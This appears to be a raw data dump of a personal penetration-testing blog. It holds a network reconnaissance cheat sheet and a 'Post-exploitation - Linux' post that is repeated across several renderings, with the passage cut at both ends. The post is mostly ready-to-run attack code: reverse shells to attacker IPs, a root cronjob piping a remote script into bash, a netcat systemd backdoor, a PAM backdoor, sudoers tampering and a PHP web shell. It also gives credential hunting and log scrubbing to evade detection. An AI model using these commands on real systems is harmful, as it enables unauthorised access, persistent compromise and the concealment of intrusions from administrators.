class=\"caption\"><span>Zenmap (GUI interface)</span></div><code class=\"highlight bash\">zenmap</code></pre>\n\n<pre><div class=\"caption\"><span>Legion (GUI interface)</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> legion</code></pre>\n<br>\n\n<pre><div class=\"caption\"><span>no man's land</span></div><code class=\"highlight bash\"><span class=\"keyword\">for</span> ip <span class=\"keyword\">in</span> 30 31 35; <span class=\"keyword\">do</span>\n    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Scanning 10.10.10.<span class=\"variable\">$ip</span>&quot;</span>\n    <span class=\"keyword\">for</span> port <span class=\"keyword\">in</span> &#123;1..65535&#125;; <span class=\"keyword\">do</span>\n        (<span class=\"built_in\">echo</span> &gt; /dev/tcp/10.10.10.<span class=\"variable\">$ip</span>/<span class=\"variable\">$port</span>) &amp;&gt;/dev/null &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Port <span class=\"variable\">$port</span> is open on 10.10.10.<span class=\"variable\">$ip</span>&quot;</span>\n    <span class=\"keyword\">done</span>\n<span class=\"keyword\">done</span></code></pre>\n\n\n<br>\n\n<h2 id=\"OSINT-recon\"><a href=\"#OSINT-recon\" class=\"headerlink\" title=\"OSINT recon\"></a>OSINT recon</h2><pre><code class=\"highlight bash\">recon-ng</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 2 in a penetration test: Reconnaissance.<br>Network (for singe and multiple hosts) and OSINT recon.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Prepare-your-environment\"><a href=\"#Prepare-your-environment\" class=\"headerlink\" title=\"Prepare your environment\"></a>Prepare your environment</h2><pre><div class=\"caption\"><span>Create a separate directory for the target</span></div><code class=\"highlight bash\"><span class=\"comment\"># replace &#x27;target&#x27;</span>\n<span class=\"built_in\">mkdir</span> -p ~/pentests/target</code></pre>\n\n<pre><div class=\"caption\"><span>Prepare the environment variables</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> NET=10.10.10.0/24\n<span class=\"built_in\">export</span> domain=example.com\n<span class=\"built_in\">export</span> IP=10.10.10.1\n<span class=\"built_in\">export</span> URL=http://<span class=\"variable\">$IP</span>\n<span class=\"comment\"># I don&#x27;t advice using $URL because you might miss other ports or HTTPS</span>\n<span class=\"comment\"># Remember to add odd web ports (8080,8000,8008) and https if needed</span></code></pre>\n\n<pre><div class=\"caption\"><span>Prepare files and directories</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> vulns recon files notes\n<span class=\"built_in\">touch</span> notes/&#123;notes.txt,users.txt,passwords.txt,hashes.txt,creds.txt&#125;</code></pre>\n\n<br>\n\n<h2 id=\"Network-recon\"><a href=\"#Network-recon\" class=\"headerlink\" title=\"Network recon\"></a>Network recon</h2><br>\n<pre><div class=\"caption\"><span>netdiscover</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> netdiscover -i eth0 -r <span class=\"variable\">$NET</span></code></pre>\n<pre><div class=\"caption\"><span>fping</span></div><code class=\"highlight bash\">fping -a -g <span class=\"variable\">$NET</span> 2&gt;/dev/null &gt; recon/hosts</code></pre>\n<pre><div class=\"caption\"><span>masscan</span></div><code class=\"highlight bash\">masscan <span class=\"variable\">$NET</span> <span class=\"built_in\">echo</span> &gt; recon/masscan-output.conf</code></pre>\n<pre><div class=\"caption\"><span>nmap</span></div><code class=\"highlight bash\">nmap -sn <span class=\"variable\">$NET</span> -oA recon/nmap.discovery;\n<span class=\"built_in\">cat</span> recon/nmap.discovery | grep -i report | <span class=\"built_in\">cut</span> -d<span class=\"string\">&#x27; &#x27;</span> -f5 &gt; recon/hosts</code></pre>\n<pre><div class=\"caption\"><span>no man's land</span></div><code class=\"highlight bash\"><span class=\"keyword\">for</span> ip <span class=\"keyword\">in</span> 30 31 35; <span class=\"keyword\">do</span> ping -c 1 -W 1 10.10.10.<span class=\"variable\">$ip</span> &amp;&gt;/dev/null &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;10.10.10.<span class=\"variable\">$ip</span> is up&quot;</span>; <span class=\"keyword\">done</span></code></pre>\n\n<br>\n\n<h2 id=\"Single-host-recon\"><a href=\"#Single-host-recon\" class=\"headerlink\" title=\"Single host recon\"></a>Single host recon</h2><pre><div class=\"caption\"><span>Nmap intelligent scan</span></div><code class=\"highlight bash\"><span class=\"comment\"># initial scan</span>\nnmap -Pn -T4 -p- --open --max-retries 5 --system-dns --stats-every 5s <span class=\"variable\">$IP</span> --oA recon/nmap.init\n<span class=\"comment\"># extract open ports</span>\n<span class=\"built_in\">cat</span> recon/nmap.init.nmap | grep <span class=\"string\">&#x27;/.*open&#x27;</span>| <span class=\"built_in\">cut</span> -d <span class=\"string\">&#x27;/&#x27;</span> -f 1| <span class=\"built_in\">tr</span> <span class=\"string\">&#x27;\\n&#x27;</span> <span class=\"string\">&#x27;, &#x27;</span>| sed <span class=\"string\">&#x27;s/.$//g&#x27;</span> &gt; recon/ports;\n<span class=\"comment\"># full scan on open ports</span>\n<span class=\"built_in\">sudo</span> nmap -Pn -sV -n -v -A -T4 -p $(<span class=\"built_in\">cat</span> recon/ports) <span class=\"variable\">$IP</span> -oA recon/nmap.alltcp</code></pre>\n<pre><div class=\"caption\"><span>Nmap vuln scan (with open ports)</span></div><code class=\"highlight bash\">nmap --script vulners -Pn -sC -sV -v -A -T4 -p $(<span class=\"built_in\">cat</span> recon/ports) <span class=\"variable\">$IP</span> -oA recon/nmap.vuln</code></pre>\n<pre><div class=\"caption\"><span>Nmap UDP scan (takes long)</span></div><code class=\"highlight bash\">nmap -sCVU -n -F -T4 <span class=\"variable\">$IP</span> -oA recon/nmap.udp</code></pre>\n<pre><div class=\"caption\"><span>Nmap IPv6 scan</span></div><code class=\"highlight bash\">ping -6 <span class=\"variable\">$IP</span>\ndig AAAA <span class=\"variable\">$domain</span>\n\nnmap -p- -6 --min-rate 10000 <span class=\"variable\">$IPv6</span>\n&lt;br&gt;\n\n```bash Rustscan\nrustscan -a <span class=\"variable\">$IP</span> --<span class=\"built_in\">ulimit</span> 5000 --batch-size 2500 -- -sC -sV -v -oN recon/rustscan.init</code></pre>\n\n<pre><div class=\"caption\"><span>Autorecon</span></div><code class=\"highlight bash\">autorecon -v --heartbeat 10</code></pre>\n\n<pre><div class=\"caption\"><span>Zenmap (GUI interface)</span></div><code class=\"highlight bash\">zenmap</code></pre>\n\n<pre><div class=\"caption\"><span>Legion (GUI interface)</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> legion</code></pre>\n<br>\n\n<pre><div class=\"caption\"><span>no man's land</span></div><code class=\"highlight bash\"><span class=\"keyword\">for</span> ip <span class=\"keyword\">in</span> 30 31 35; <span class=\"keyword\">do</span>\n    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Scanning 10.10.10.<span class=\"variable\">$ip</span>&quot;</span>\n    <span class=\"keyword\">for</span> port <span class=\"keyword\">in</span> &#123;1..65535&#125;; <span class=\"keyword\">do</span>\n        (<span class=\"built_in\">echo</span> &gt; /dev/tcp/10.10.10.<span class=\"variable\">$ip</span>/<span class=\"variable\">$port</span>) &amp;&gt;/dev/null &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Port <span class=\"variable\">$port</span> is open on 10.10.10.<span class=\"variable\">$ip</span>&quot;</span>\n    <span class=\"keyword\">done</span>\n<span class=\"keyword\">done</span></code></pre>\n\n\n<br>\n\n<h2 id=\"OSINT-recon\"><a href=\"#OSINT-recon\" class=\"headerlink\" title=\"OSINT recon\"></a>OSINT recon</h2><pre><code class=\"highlight bash\">recon-ng</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"7. Post-exploitation - Linux","date":"2024-08-02T12:00:00.000Z","toc":true,"_content":"\n---\nStep 7 in a penetration test: Post-exploitation.\nInstall backdoors for persistence, extract credentials and relevant data, clean step foots. \n\n---\n<!-- more -->\n\n<br>\n\n\n## Credentials\n```bash Eviltree\n# regex\npython3 eviltree.py -r $dir -x \".{0,3}passwd.{0.3}[=]{1}.{0,18}\" -A -q -i -v\n# keywords\npython3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v\n```\n\n<br>\n\n## Persistence\nSSH backdoor\n```bash\ngit clone https://github.com/NinjaJc01/ssh-backdoor\n```\n\nAdd yourself to authorized users\n```bash\n# on local machine: generate public key\nssh-keygen \n# on local machine: copy the public key to victim\nscp ~/.ssh/id_rsa.pub remote-user@$IP:~/.ssh/\n# on victim machine: add the public key to authorized_keys \ncat ~/.ssh/id_rsa.pub >> authorized_keys\n# on local machine: set the file permissions\nchmod 600 ~/.ssh/authorized_keys\n# on local machine: SSH in\nssh -i ~/.ssh/id_rsa remote-user@$IP # -o PubkeyAcceptedKeyTypes=rsa-sha2-256 \n```\n\nCreate a cronjob\n```bash shell.sh\n#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.109/443 0>&1\n```\n```bash create cronjob\necho \"* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &\" >> /etc/crontab\n```\n\nRevshell via `.bashrc`\n```bash\necho 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1' >> ~/.bashrc\n```\n\nPAM (Pluggable Authentication Modules) Backdoor\n```bash\ngit clone https://github.com/zephrax/linux-pam-backdoor\n# generate backdoored pam_unix.so\n./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd\n\n# !! identify the PAM version installed on the system !!\n\n# copy the generated backdoor to the afferent directory\ncp pam_unix.so /usr/lib/security/\n```\n\nCustom service\n```bash\nnano ~/.config/systemd/user/backdoor.service\n```\n```conf ~/.config/systemd/user/backdoor.service\n[Unit]\nDescription=Very important backdoor.[Service]\nType=simple\nExecStart=/usr/bin/nc -e /bin/bash 10.10.10.10 443 2>/dev/null\n[Install]\nWantedBy=default.target\n```\n```bash\nsystemctl --user enable backdoor\n```\n\nAdd user to sudoers\n```bash\necho 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers\n```\n\nPHP backdoor in webapp\n```php\n<?php\n    if (isset($_REQUEST['explicit_cmd'])) {\n        echo \"<pre>\" . shell_exec($_REQUEST['explicit_cmd']) . \"</pre>\";\n    }\n?>\n```\n\nBackground reverse shell\n```bash Reverse shell every 2 minutes\n# $att_ip is the attacker's IP\nwhile :; do setsid bash -i &>/dev/tcp/$att_ip/8443 0>&1; sleep 120; done &>/dev/null &\n```\n\n<br>\n\n## Avoid detection\nHide your SSH connection\n> nothing is added to `/var/log/utmp`\n> user won't appear in `w` or `who` output\n```bash\nssh -o UserKnownHostsFile=/dev/null -T user@$IP 'bash -i'\n```\n\nChange file timestamp\n```bash\ntouch -t YYYYMMDDhhmm filename\n```\n\nDon't remove log files - it is suspicious. Replace the domains and IPs\n```bash\ncd /dev/shm; grep -v \"$domain\" /var/log/auth.log > a.log; cat a.log > /var/log/auth.log; rm -f a.log\n```\n\nHide a command by masking it in the `syslogd`\n```bash scan the victim's network\nexec -a syslogd nmap -T0 10.0.2.1/24\n```\n\nStart a background hidden process in the `syslogd`\n```bash\nexec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &\n```\n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/7.md","raw":"---\ntitle: 7. Post-exploitation - Linux\ndate: 2024-08-02 15:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Post-exploitation\n  - Persistence\ntoc: true\n---\n\n---\nStep 7 in a penetration test: Post-exploitation.\nInstall backdoors for persistence, extract credentials and relevant data, clean step foots. \n\n---\n<!-- more -->\n\n<br>\n\n\n## Credentials\n```bash Eviltree\n# regex\npython3 eviltree.py -r $dir -x \".{0,3}passwd.{0.3}[=]{1}.{0,18}\" -A -q -i -v\n# keywords\npython3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v\n```\n\n<br>\n\n## Persistence\nSSH backdoor\n```bash\ngit clone https://github.com/NinjaJc01/ssh-backdoor\n```\n\nAdd yourself to authorized users\n```bash\n# on local machine: generate public key\nssh-keygen \n# on local machine: copy the public key to victim\nscp ~/.ssh/id_rsa.pub remote-user@$IP:~/.ssh/\n# on victim machine: add the public key to authorized_keys \ncat ~/.ssh/id_rsa.pub >> authorized_keys\n# on local machine: set the file permissions\nchmod 600 ~/.ssh/authorized_keys\n# on local machine: SSH in\nssh -i ~/.ssh/id_rsa remote-user@$IP # -o PubkeyAcceptedKeyTypes=rsa-sha2-256 \n```\n\nCreate a cronjob\n```bash shell.sh\n#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.109/443 0>&1\n```\n```bash create cronjob\necho \"* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &\" >> /etc/crontab\n```\n\nRevshell via `.bashrc`\n```bash\necho 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1' >> ~/.bashrc\n```\n\nPAM (Pluggable Authentication Modules) Backdoor\n```bash\ngit clone https://github.com/zephrax/linux-pam-backdoor\n# generate backdoored pam_unix.so\n./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd\n\n# !! identify the PAM version installed on the system !!\n\n# copy the generated backdoor to the afferent directory\ncp pam_unix.so /usr/lib/security/\n```\n\nCustom service\n```bash\nnano ~/.config/systemd/user/backdoor.service\n```\n```conf ~/.config/systemd/user/backdoor.service\n[Unit]\nDescription=Very important backdoor.[Service]\nType=simple\nExecStart=/usr/bin/nc -e /bin/bash 10.10.10.10 443 2>/dev/null\n[Install]\nWantedBy=default.target\n```\n```bash\nsystemctl --user enable backdoor\n```\n\nAdd user to sudoers\n```bash\necho 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers\n```\n\nPHP backdoor in webapp\n```php\n<?php\n    if (isset($_REQUEST['explicit_cmd'])) {\n        echo \"<pre>\" . shell_exec($_REQUEST['explicit_cmd']) . \"</pre>\";\n    }\n?>\n```\n\nBackground reverse shell\n```bash Reverse shell every 2 minutes\n# $att_ip is the attacker's IP\nwhile :; do setsid bash -i &>/dev/tcp/$att_ip/8443 0>&1; sleep 120; done &>/dev/null &\n```\n\n<br>\n\n## Avoid detection\nHide your SSH connection\n> nothing is added to `/var/log/utmp`\n> user won't appear in `w` or `who` output\n```bash\nssh -o UserKnownHostsFile=/dev/null -T user@$IP 'bash -i'\n```\n\nChange file timestamp\n```bash\ntouch -t YYYYMMDDhhmm filename\n```\n\nDon't remove log files - it is suspicious. Replace the domains and IPs\n```bash\ncd /dev/shm; grep -v \"$domain\" /var/log/auth.log > a.log; cat a.log > /var/log/auth.log; rm -f a.log\n```\n\nHide a command by masking it in the `syslogd`\n```bash scan the victim's network\nexec -a syslogd nmap -T0 10.0.2.1/24\n```\n\nStart a background hidden process in the `syslogd`\n```bash\nexec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &\n```\n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/7","published":1,"updated":"2024-09-23T06:18:55.861Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhq000i6gvggfr13g32","content":"<hr>\n<p>Step 7 in a penetration test: Post-exploitation.<br>Install backdoors for persistence, extract credentials and relevant data, clean step foots. </p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n<h2 id=\"Credentials\"><a href=\"#Credentials\" class=\"headerlink\" title=\"Credentials\"></a>Credentials</h2><pre><div class=\"caption\"><span>Eviltree</span></div><code class=\"highlight bash\"><span class=\"comment\"># regex</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -x <span class=\"string\">&quot;.&#123;0,3&#125;passwd.&#123;0.3&#125;[=]&#123;1&#125;.&#123;0,18&#125;&quot;</span> -A -q -i -v\n<span class=\"comment\"># keywords</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -k passw,db_,admin,account,user,token -A -q -i -v</code></pre>\n\n<br>\n\n<h2 id=\"Persistence\"><a href=\"#Persistence\" class=\"headerlink\" title=\"Persistence\"></a>Persistence</h2><p>SSH backdoor</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/NinjaJc01/ssh-backdoor</code></pre>\n\n<p>Add yourself to authorized users</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># on local machine: generate public key</span>\nssh-keygen \n<span class=\"comment\"># on local machine: copy the public key to victim</span>\nscp ~/.ssh/id_rsa.pub remote-user@<span class=\"variable\">$IP</span>:~/.ssh/\n<span class=\"comment\"># on victim machine: add the public key to authorized_keys </span>\n<span class=\"built_in\">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys\n<span class=\"comment\"># on local machine: set the file permissions</span>\n<span class=\"built_in\">chmod</span> 600 ~/.ssh/authorized_keys\n<span class=\"comment\"># on local machine: SSH in</span>\nssh -i ~/.ssh/id_rsa remote-user@<span class=\"variable\">$IP</span> <span class=\"comment\"># -o PubkeyAcceptedKeyTypes=rsa-sha2-256 </span></code></pre>\n\n<p>Create a cronjob</p>\n<pre><div class=\"caption\"><span>shell.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\nbash -i &gt;&amp; /dev/tcp/10.10.10.109/443 0&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>create cronjob</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &amp;&quot;</span> &gt;&gt; /etc/crontab</code></pre>\n\n<p>Revshell via <code>.bashrc</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#x27;</span> &gt;&gt; ~/.bashrc</code></pre>\n\n<p>PAM (Pluggable Authentication Modules) Backdoor</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/zephrax/linux-pam-backdoor\n<span class=\"comment\"># generate backdoored pam_unix.so</span>\n./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd\n\n<span class=\"comment\"># !! identify the PAM version installed on the system !!</span>\n\n<span class=\"comment\"># copy the generated backdoor to the afferent directory</span>\n<span class=\"built_in\">cp</span> pam_unix.so /usr/lib/security/</code></pre>\n\n<p>Custom service</p>\n<pre><code class=\"highlight bash\">nano ~/.config/systemd/user/backdoor.service</code></pre>\n<pre><div class=\"caption\"><span>~/.config/systemd/user/backdoor.service</span></div><code class=\"highlight conf\">[Unit]\nDescription=Very important backdoor.[Service]\nType=simple\nExecStart=/usr/bin/nc -e /bin/bash 10.10.10.10 443 2&gt;/dev/null\n[Install]\nWantedBy=default.target</code></pre>\n<pre><code class=\"highlight bash\">systemctl --user <span class=\"built_in\">enable</span> backdoor</code></pre>\n\n<p>Add user to sudoers</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;username        ALL=(ALL)        NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers</code></pre>\n\n<p>PHP backdoor in webapp</p>\n<pre><code class=\"highlight php\"><span class=\"meta\">&lt;?php</span>\n    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;explicit_cmd&#x27;</span>])) &#123;\n        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span> . <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;explicit_cmd&#x27;</span>]) . <span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>;\n    &#125;\n<span class=\"meta\">?&gt;</span></code></pre>\n\n<p>Background reverse shell</p>\n<pre><div class=\"caption\"><span>Reverse shell every 2 minutes</span></div><code class=\"highlight bash\"><span class=\"comment\"># $att_ip is the attacker&#x27;s IP</span>\n<span class=\"keyword\">while</span> :; <span class=\"keyword\">do</span> setsid bash -i &amp;&gt;/dev/tcp/<span class=\"variable\">$att_ip</span>/8443 0&gt;&amp;1; <span class=\"built_in\">sleep</span> 120; <span class=\"keyword\">done</span> &amp;&gt;/dev/null &amp;</code></pre>\n\n<br>\n\n<h2 id=\"Avoid-detection\"><a href=\"#Avoid-detection\" class=\"headerlink\" title=\"Avoid detection\"></a>Avoid detection</h2><p>Hide your SSH connection</p>\n<blockquote>\n<p>nothing is added to <code>/var/log/utmp</code><br>user wont appear in <code>w</code> or <code>who</code> output</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ssh -o UserKnownHostsFile=/dev/null -T user@<span class=\"variable\">$IP</span> <span class=\"string\">&#x27;bash -i&#x27;</span></code></pre>\n\n<p>Change file timestamp</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">touch</span> -t YYYYMMDDhhmm filename</code></pre>\n\n<p>Dont remove log files - it is suspicious. Replace the domains and IPs</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cd</span> /dev/shm; grep -v <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> /var/log/auth.log &gt; a.log; <span class=\"built_in\">cat</span> a.log &gt; /var/log/auth.log; <span class=\"built_in\">rm</span> -f a.log</code></pre>\n\n<p>Hide a command by masking it in the <code>syslogd</code></p>\n<pre><div class=\"caption\"><span>scan the victim's network</span></div><code class=\"highlight bash\"><span class=\"built_in\">exec</span> -a syslogd nmap -T0 10.0.2.1/24</code></pre>\n\n<p>Start a background hidden process in the <code>syslogd</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">exec</span> -a syslogd nmap -T0 10.0.2.1/24 &amp;&gt;nmap.log &amp;</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 7 in a penetration test: Post-exploitation.<br>Install backdoors for persistence, extract credentials and relevant data, clean step foots. </p>\n<hr>","more":"<br>\n\n\n<h2 id=\"Credentials\"><a href=\"#Credentials\" class=\"headerlink\" title=\"Credentials\"></a>Credentials</h2><pre><div class=\"caption\"><span>Eviltree</span></div><code class=\"highlight bash\"><span class=\"comment\"># regex</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -x <span class=\"string\">&quot;.&#123;0,3&#125;passwd.&#123;0.3&#125;[=]&#123;1&#125;.&#123;0,18&#125;&quot;</span> -A -q -i -v\n<span class=\"comment\"># keywords</span>\npython3 eviltree.py -r <span class=\"variable\">$dir</span> -k passw,db_,admin,account,user,token -A -q -i -v</code></pre>\n\n<br>\n\n<h2 id=\"Persistence\"><a href=\"#Persistence\" class=\"headerlink\" title=\"Persistence\"></a>Persistence</h2><p>SSH backdoor</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/NinjaJc01/ssh-backdoor</code></pre>\n\n<p>Add yourself to authorized users</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># on local machine: generate public key</span>\nssh-keygen \n<span class=\"comment\"># on local machine: copy the public key to victim</span>\nscp ~/.ssh/id_rsa.pub remote-user@<span class=\"variable\">$IP</span>:~/.ssh/\n<span class=\"comment\"># on victim machine: add the public key to authorized_keys </span>\n<span class=\"built_in\">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys\n<span class=\"comment\"># on local machine: set the file permissions</span>\n<span class=\"built_in\">chmod</span> 600 ~/.ssh/authorized_keys\n<span class=\"comment\"># on local machine: SSH in</span>\nssh -i ~/.ssh/id_rsa remote-user@<span class=\"variable\">$IP</span> <span class=\"comment\"># -o PubkeyAcceptedKeyTypes=rsa-sha2-256 </span></code></pre>\n\n<p>Create a cronjob</p>\n<pre><div class=\"caption\"><span>shell.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\nbash -i &gt;&amp; /dev/tcp/10.10.10.109/443 0&gt;&amp;1</code></pre>\n<pre><div class=\"caption\"><span>create cronjob</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &amp;&quot;</span> &gt;&gt; /etc/crontab</code></pre>\n\n<p>Revshell via <code>.bashrc</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#x27;</span> &gt;&gt; ~/.bashrc</code></pre>\n\n<p>PAM (Pluggable Authentication Modules) Backdoor</p>\n<pre><code class=\"highlight bash\">git <span class=\"built_in\">clone</span> https://github.com/zephrax/linux-pam-backdoor\n<span class=\"comment\"># generate backdoored pam_unix.so</span>\n./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd\n\n<span class=\"comment\"># !! identify the PAM version installed on the system !!</span>\n\n<span class=\"comment\"># copy the generated backdoor to the afferent directory</span>\n<span class=\"built_in\">cp</span> pam_unix.so /usr/lib/security/</code></pre>\n\n<p>Custom service</p>\n<pre><code class=\"highlight bash\">nano ~/.config/systemd/user/backdoor.service</code></pre>\n<pre><div class=\"caption\"><span>~/.config/systemd/user/backdoor.service</span></div><code class=\"highlight conf\">[Unit]\nDescription=Very important backdoor.[Service]\nType=simple\nExecStart=/usr/bin/nc -e /bin/bash 10.10.10.10 443 2&gt;/dev/null\n[Install]\nWantedBy=default.target</code></pre>\n<pre><code class=\"highlight bash\">systemctl --user <span class=\"built_in\">enable</span> backdoor</code></pre>\n\n<p>Add user to sudoers</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;username        ALL=(ALL)        NOPASSWD: ALL&#x27;</span> &gt;&gt; /etc/sudoers</code></pre>\n\n<p>PHP backdoor in webapp</p>\n<pre><code class=\"highlight php\"><span class=\"meta\">&lt;?php</span>\n    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;explicit_cmd&#x27;</span>])) &#123;\n        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span> . <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;explicit_cmd&#x27;</span>]) . <span class=\"string\">&quot;&lt;/pre&gt;&quot;</span>;\n    &#125;\n<span class=\"meta\">?&gt;</span></code></pre>\n\n<p>Background reverse shell</p>\n<pre><div class=\"caption\"><span>Reverse shell every 2 minutes</span></div><code class=\"highlight bash\"><span class=\"comment\"># $att_ip is the attacker&#x27;s IP</span>\n<span class=\"keyword\">while</span> :; <span class=\"keyword\">do</span> setsid bash -i &amp;&gt;/dev/tcp/<span class=\"variable\">$att_ip</span>/8443 0&gt;&amp;1; <span class=\"built_in\">sleep</span> 120; <span class=\"keyword\">done</span> &amp;&gt;/dev/null &amp;</code></pre>\n\n<br>\n\n<h2 id=\"Avoid-detection\"><a href=\"#Avoid-detection\" class=\"headerlink\" title=\"Avoid detection\"></a>Avoid detection</h2><p>Hide your SSH connection</p>\n<blockquote>\n<p>nothing is added to <code>/var/log/utmp</code><br>user wont appear in <code>w</code> or <code>who</code> output</p>\n</blockquote>\n<pre><code class=\"highlight bash\">ssh -o UserKnownHostsFile=/dev/null -T user@<span class=\"variable\">$IP</span> <span class=\"string\">&#x27;bash -i&#x27;</span></code></pre>\n\n<p>Change file timestamp</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">touch</span> -t YYYYMMDDhhmm filename</code></pre>\n\n<p>Dont remove log files - it is suspicious. Replace the domains and IPs</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cd</span> /dev/shm; grep -v <span class=\"string\">&quot;<span class=\"variable\">$domain</span>&quot;</span> /var/log/auth.log &gt; a.log; <span class=\"built_in\">cat</span> a.log &gt; /var/log/auth.log; <span class=\"built_in\">rm</span> -f a.log</code></pre>\n\n<p>Hide a command by masking it in the <code>syslogd</code></p>\n<pre><div class=\"caption\"><span>scan the victim's network</span></div><code class=\"highlight bash\"><span class=\"built_in\">exec</span> -a syslogd nmap -T0 10.0.2.1/24</code></pre>\n\n<p>Start a background hidden process in the <code>syslogd</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">exec</span> -a syslogd nmap -T0 10.0.2.1/24 &amp;&gt;nmap.log &amp;</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"Linux - Learning Resources","date":"2024-08-01T07:00:00.000Z","toc":true,"_content":"\n---\nRelevant materials and insights about penetration testing from and of a Linux environment.\n\n---\n<!-- more -->\n\n## Courses\n\n| Description | Link |\n| --- | --- |\n|  |  |\n\n<br>\n\n## Blogs and explanations\n\n| Description | Link |\n| --- | --- |\n| Windows/Linux Local PrivEsc | https://github.com/sagishahar/lpeworkshop |\n| Generate rev shells | https://weibell.github.io/reverse-shell-generator/ |\n| Metasploit documentation | https://docs.metasploit.com/ |\n| Advance InfoSec Concepts  | https://blog.certcube.com/ |\n| File transfer cheatsheet | https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/ |\n| Pivoting and SSH tunneling | https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/ |\n| Linux ACL (Access control list) | https://www.geeksforgeeks.org/access-control-listsacl-linux/ |\n| Crack hashes online | https://hashes.com/en/decrypt/hash |\n| Crack hashes online | https://crackstation.net/ |\n| Layer 4 attacks | https://charlesreid1.com/wiki/Kali/Layer_4_Attacks |\n\n<br>\n\n## Cheatsheets\n\n| Description | Link |\n| --- | --- |\n| Escape Linux restricted env | https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf |\n| Escape Linux restricted env | https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ |\n| Linux binaries used for exploitation | https://gtfobins.github.io/ |\n| Printer Security Testing Cheat Sheet | 